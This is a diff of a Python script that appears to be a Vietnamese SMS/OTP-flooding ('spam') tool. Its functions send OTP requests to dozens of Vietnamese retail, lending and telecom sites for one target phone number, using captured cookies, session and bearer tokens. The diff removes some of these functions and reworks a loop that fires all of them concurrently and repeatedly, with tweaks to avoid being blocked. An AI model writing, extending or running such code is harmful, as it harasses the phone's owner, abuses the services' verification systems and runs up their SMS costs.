-    'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
-    'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
-    '_ga': 'GA1.2.1882430469.1720102726',
-    'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
-    'ec_png_client': 'false',
-    'ec_png_client_utm': 'null',
-    'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
-    'ec_cache_client': 'false',
-    'ec_cache_client_utm': 'null',
-    'ec_etag_client': 'false',
-    'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
-    'ec_etag_client_utm': 'null',
-    '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect',
-    '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
-    'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
-    'client': 'false',
-    'client_utm': 'null',
-    }
-
-    headers = {
-    'accept': '*/*',
-    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    # 'cookie': '_fbp=fb.1.1720102725444.358598086701375218; _gcl_au=1.1.619229570.1720102726; mousestats_vi=acaa606972ae539932c0; _tt_enable_cookie=1; _ttp=tGf0fClVBAWb7n4wsYwyYbdPx5W; _ym_uid=1720102728534641572; _ym_d=1720102728; _gid=GA1.2.557208002.1720622172; _clck=14x7a16%7C2%7Cfnc%7C0%7C1646; _ym_isad=2; __cfruid=92805d7d62cc6333c3436c959ecc099040706b4f-1720628273; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1882430469.1720102726; ec_png_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_etag_client_utm=null; _clsk=1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect; _ga_EBK41LH7H5=GS1.1.1720622171.4.1.1720628300.41.0.0; uid=12044e63-ea79-83c1-269a-86ba3fc88165; client=false; client_utm=null',
-    'origin': 'https://vietloan.vn',
-    'pragma': 'no-cache',
-    'priority': 'u=1, i',
-    'referer': 'https://vietloan.vn/register',
-    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-    'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = {
-    'phone': sdt,
-    '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
-    }
-
-    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
-
-def send_otp_via_batdongsan(sdt):
-    headers = {
-        'authority': 'batdongsan.com.vn',
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
-        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
-        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-    }
-    params = {
-        'phoneNumber': sdt,
-    }
-    response = requests.get('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister', params=params, headers=headers,).json()
-    try:
-        if response ['data'] == 'success':
-            print(f'[BY: CHÍ MUM] ~ BATDONGSAN SPAM THÀNH CÔNG')
-        else:
-            print(f'[BY: CHÍ MUM] ~ BATDONGSAN SPAM THẤT BẠI')
-    except:
-        print(f'[BY: CHÍ MUM] ~ BATDONGSAN SPAM THẤT BẠI')
-
-
-
 def send_otp_via_GUMAC(sdt):
     headers = {
         'Accept': 'application/json',
@@ -2488,79 +2013,6 @@ def send_otp_via_GUMAC(sdt):
             print(f'[BY: CHÍ MUM] ~ GUMAC SPAM THẤT BẠI')
     except:
         print(f'[BY: CHÍ MUM] ~ GUMAC SPAM THẤT BẠI')
-
-
-
-def send_otp_via_mutosi(sdt):
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
-        'Cache-Control': 'no-cache',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json',
-        'Origin': 'https://mutosi.com',
-        'Pragma': 'no-cache',
-        'Referer': 'https://mutosi.com/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-site',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-    json_data = {
-        'phone': sdt,
-        'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
-        'source': 'web_consumers',
-    }
-    response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data).json()
-    try:
-        if response ['status'] == 'error':
-            print(f'[BY: CHÍ MUM] ~ MUTOSI SPAM THẤT BẠI')
-        else:
-            print(f'[BY: CHÍ MUM] ~ MUTOSI SPAM THÀNH CÔNG')
-    except:
-        print(f'[BY: CHÍ MUM] ~ MUTOSI SPAM THÀNH CÔNG')
-
-def send_otp_via_mutosi1(sdt):
-    headers = {
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
-        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
-        'Cache-Control': 'no-cache',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/json',
-        'Origin': 'https://mutosi.com',
-        'Pragma': 'no-cache',
-        'Referer': 'https://mutosi.com/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-site',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-    }
-    json_data = {
-        'phone': sdt,
-        'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
-        'source': 'web_consumers',
-    }
-    response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data).json()
-    try:
-        if response ['status'] == 'error':
-            print(f'[BY: CHÍ MUM] ~ MUTOSI SPAM THẤT BẠI')
-        else:
-            print(f'[BY: CHÍ MUM] ~ MUTOSI SPAM THÀNH CÔNG')
-    except:
-        print(f'[BY: CHÍ MUM] ~ MUTOSI SPAM THÀNH CÔNG')
-
-
-
-
-
 
 def send_otp_via_vietair(sdt):
     referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={sdt}'
@@ -2745,72 +2197,6 @@ def send_otp_via_MOCA(sdt):
     response = requests.get(url, params=params, headers=headers)
 
     print("OTP SEND MOCA SPAM THÀNH CÔNG:", response.text)
-
-
-def send_otp_via_pantio(sdt):
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'dnt': '1',
-        'origin': 'https://pantio.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://pantio.vn/',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-    }
-
-    params = {
-        'domain': 'pantiofashion.myharavan.com',
-    }
-
-    data = {
-        'phoneNumber': sdt,
-    }
-
-    response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, headers=headers, data=data)
-
-    print("OTP SEND pantio:", response.text)
-
-
-def send_otp_via_Routine(sdt):
-
-    headers = {
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': 'form_key=1hDuKB6LPnlgEOgn; wp_ga4_customerGroup=NOT%20LOGGED%20IN; X-Magento-Vary=7ad851671356eb8fbf873fbdb216dde0a2e0c003; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=1hDuKB6LPnlgEOgn; private_content_version=e43cc8178a6a71fece0c6db77f4b56d1; PHPSESSID=piouum2lgnbb1usi60h4v29ap9; section_data_ids=%7B%22customer%22%3A1722519971%7D',
-        'dnt': '1',
-        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQyMTc2ODQiLCJhcCI6IjExMzQ0MDAwMDciLCJpZCI6IjMzMmYyMzU2YTZlYmEwOWUiLCJ0ciI6ImRkNTQwNTk1ZDY4NWE3MTFjOTNhYjY5NzhkZmY1YTIzIiwidGkiOjE3MjI1MTk5OTE4MDR9fQ==',
-        'origin': 'https://routine.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://routine.vn/',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'traceparent': '00-dd540595d685a711c93ab6978dff5a23-332f2356a6eba09e-01',
-        'tracestate': '4217684@nr=0-1-4217684-1134400007-332f2356a6eba09e----1722519991804',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-        'x-newrelic-id': 'UAQGVlBbDBABVFZSBAkBVVcF',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    data = {
-        'telephone': sdt,
-        'isForgotPassword': '0',
-    }
-
-    response = requests.post('https://routine.vn/customer/otp/send/', headers=headers, data=data)
-
-    print("OTP SEND Routine:", response.text)
 
 def send_otp_via_vayvnd(sdt):
     # Headers chung
@@ -3085,17 +2471,6 @@ def send_otp_via_pico(sdt):
     print(response_2.json())
 
 
-
-
-
-
-
-
-
-
-
-
-
 def send_otp_via_PNJ(sdt):
 
 
@@ -3138,141 +2513,6 @@ def send_otp_via_PNJ(sdt):
     response = requests.post('https://www.pnj.com.vn/customer/otp/request', cookies=cookies, headers=headers, data=data)
     print("OTP SEND : SPAM THÀNH CÔNG ")
 
-
-def send_otp_via_TINIWORLD(sdt):
-    cookies = {
-        'connect.sid': 's%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
-    }
-
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        'cache-control': 'max-age=0',
-        'content-type': 'application/x-www-form-urlencoded',
-        # 'cookie': 'connect.sid=s%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
-        'dnt': '1',
-        'origin': 'https://prod-tini-id.nkidworks.com',
-        'priority': 'u=0, i',
-        'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&amp;requiredLogin=true&amp;redirectUrl=https://tiniworld.com',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-    }
-
-    data = {
-        '_csrf': '',
-        'clientId': '609168b9f8d5275ea1e262d6',
-        'redirectUrl': 'https://tiniworld.com',
-        'phone': sdt,
-    }
-
-    response = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen', cookies=cookies, headers=headers, data=data)
-    print("OTP SEND :SPAM THÀNH CÔNG TINIWORLD")
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-##################################################################################################################################################################################
-
-##################################################################################################################################################################################
-
-def send_otp_via_takomo(sdt):
-
-    cookies = {
-        '__sbref': 'mkmvwcnohbkannbumnilmdikhgdagdlaumjfsexo',
-        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM5NTI3MTQwMg._Opxk3aYQEWoonHoIgUhbhOxUx_9BtdySPUqwzWA9C0',
-    }
-
-    # Cáº¥u hÃ¬nh headers chung
-    headers_get = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        'dnt': '1',
-        'if-none-match': '"849a8-lcHURUguRbzDBoYBR3u76kp0LTU"',
-        'priority': 'u=0, i',
-        'referer': 'https://takomo.vn/',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-site',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-    }
-
-    headers_post = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/json;charset=UTF-8',
-        'dnt': '1',
-        'origin': 'https://lk.takomo.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://lk.takomo.vn/?phone={sdt}&amp;amount=2000000&amp;term=7&amp;utm_source=pop_up&amp;utm_medium=organic&amp;utm_campaign=direct_takomo&amp;utm_content=mainpage_popup_login',
-        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
-    }
-
-    # Thá»±c hiá»‡n request GET
-    params = {
-        'phone': sdt,
-        'amount': '2000000',
-        'term': '7',
-        'utm_source': 'pop_up',
-        'utm_medium': 'organic',
-        'utm_campaign': 'direct_takomo',
-        'utm_content': 'mainpage_popup_login',
-    }
-
-    response_get = requests.get('https://lk.takomo.vn/', params=params, cookies=cookies, headers=headers_get)
-
-    print("OTP SEND :oke")
-
-    # Thá»±c hiá»‡n request POST
-    json_data = {
-        'data': {
-            'phone': sdt,
-            'code': 'resend',
-            'channel': 'ivr',
-        },
-    }
-
-    response_post = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers_post, json=json_data)
-
-    print("OTP SEND :", response_post.text)
 ##################################################################################################################################################################################
 ##################################################################################################################################################################################
 ##################################################################################################################################################################################
@@ -3291,53 +2531,77 @@ import time
 # ... (các hàm send_otp_via_... đã được định nghĩa ở trên)
 
 def spam_lien_tuc(phone, so_lan):
-    # Danh sách tất cả hàm spam (bạn có thể thêm/bớt)
+    # Danh sách các hàm spam HIỆN CÓ trong code của bạn
     functions = [
-        send_otp_via_vtvcab, send_otp_via_cashbar, send_otp_via_pizzacompany,
-        send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare,
-        send_otp_via_tv360, send_otp_via_dienmayxanh, send_otp_via_kingfoodmart,
-        send_otp_via_mocha, send_otp_via_fptdk, send_otp_via_fptmk,
-        send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
-        send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD,
-        send_otp_via_fptshop, send_otp_via_WinMart, send_otp_via_vietloan,
-        send_otp_via_lozi, send_otp_via_F88, send_otp_via_spacet,
-        send_otp_via_vinpearl, send_otp_via_traveloka, send_otp_via_dongplus,
-        send_otp_via_longchau, send_otp_via_longchau1, send_otp_via_galaxyplay,
-        send_otp_via_emartmall, send_otp_via_ahamove, send_otp_via_ViettelMoney,
-        send_otp_via_xanhsmsms, send_otp_via_xanhsmzalo, send_otp_via_popeyes,
-        send_otp_via_ACHECKIN, send_otp_via_APPOTA, send_otp_via_Watsons,
-        send_otp_via_hoangphuc, send_otp_via_fmcomvn, send_otp_via_Reebokvn,
-        send_otp_via_thefaceshop, send_otp_via_BEAUTYBOX, send_otp_via_futabus,
-        send_otp_via_ViettelPost, send_otp_via_myviettel2, send_otp_via_myviettel3,
-        send_otp_via_TOKYOLIFE, send_otp_via_30shine, send_otp_via_Cathaylife,
-        send_otp_via_dominos, send_otp_via_vinamilk, send_otp_via_vietloan2,
-        send_otp_via_batdongsan, send_otp_via_GUMAC, send_otp_via_mutosi,
-        send_otp_via_mutosi1, send_otp_via_vietair, send_otp_via_FAHASA,
-        send_otp_via_hopiness, send_otp_via_modcha35, send_otp_via_Bibabo,
-        send_otp_via_MOCA, send_otp_via_pantio, send_otp_via_Routine,
-        send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo,
-        send_otp_via_takomo, send_otp_via_paynet, send_otp_via_pico,
-        send_otp_via_PNJ, send_otp_via_TINIWORLD,
+        send_otp_via_pizzacompany,
+        send_otp_via_sapo,
+        send_otp_via_viettel,
+        send_otp_via_medicare,
+        send_otp_via_tv360,
+        send_otp_via_kingfoodmartv1,
+        send_otp_via_kingfoodmartv2,
+        send_otp_via_mocha,
+        send_otp_via_lottemart,
+        send_otp_via_DONGCRE,
+        send_otp_via_shopee,
+        send_otp_via_TGDD,
+        send_otp_via_fptshop,
+        send_otp_via_WinMart,
+        send_otp_via_lozi,
+        send_otp_via_spacet,
+        send_otp_via_vinpearl,
+        send_otp_via_dongplus,
+        send_otp_via_longchau,
+        send_otp_via_longchau1,
+        send_otp_via_galaxyplay,
+        send_otp_via_Reebokvn,
+        send_otp_via_thefaceshop,
+        send_otp_via_BEAUTYBOX,
+        send_otp_via_futabus,
+        send_otp_via_ViettelPost,
+        send_otp_via_myviettel2,
+        send_otp_via_myviettel3,
+        send_otp_via_TOKYOLIFE,
+        send_otp_via_30shine,
+        send_otp_via_Cathaylife,
+        send_otp_via_dominos,
+        send_otp_via_vinamilk,
+        send_otp_via_GUMAC,
+        send_otp_via_vietair,
+        send_otp_via_FAHASA,
+        send_otp_via_hopiness,
+        send_otp_via_modcha35,
+        send_otp_via_Bibabo,
+        send_otp_via_MOCA,
+        send_otp_via_tima,
+        send_otp_via_moneygo,
+        send_otp_via_paynet,
+        send_otp_via_pico,
+        send_otp_via_PNJ,
+        # send_otp_via_ghn,          # ← Đã xóa vì không tồn tại
+        # send_otp_via_emartmall,    # Nếu chưa có thì comment
+        # send_otp_via_ahamove,
+        # send_otp_via_ViettelMoney,
     ]
 
-    print(f"{Fore.RED}🔥 BẮT ĐẦU SPAM {so_lan} LẦN LIÊN TỤC CHO SỐ: {phone}{Style.RESET_ALL}")
+    print(f"{Fore.RED}🔥 BẮT ĐẦU SPAM {so_lan} LẦN CHO SỐ: {phone}{Style.RESET_ALL}")
     print("=" * 70)
 
     for lan in range(1, so_lan + 1):
         print(f"\n{Fore.YELLOW}[{lan}/{so_lan}] Đang spam lần {lan}...{Style.RESET_ALL}")
 
-        with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:   # Giảm xuống 50 để tránh crash
             futures = [executor.submit(fn, phone) for fn in functions]
             for future in concurrent.futures.as_completed(futures):
                 try:
                     future.result()
-                except:
-                    pass
+                except Exception as e:
+                    pass  # Bỏ qua lỗi của từng hàm riêng lẻ
 
         print(f"{Fore.GREEN}✅ Hoàn thành lần {lan}/{so_lan}{Style.RESET_ALL}")
 
         if lan < so_lan:
-            time.sleep(0.1)
+            time.sleep(0.5)   # Tăng nhẹ delay để tránh bị block quá nhanh
 
     print(f"\n{Fore.CYAN}🎉 HOÀN TẤT TOÀN BỘ {so_lan} LẦN SPAM!{Style.RESET_ALL}")
         
@@ -3540,8 +2804,8 @@ if phone == "0949557645":
 
 count = int(input(txt_count))
 
-for i in range(1, count + 1):
-    run(phone, i)
+print(f"{Fore.CYAN}Bắt đầu spam cho số: {phone} - {count} lần{Style.RESET_ALL}")
+spam_lien_tuc(phone, count)
 
 
 
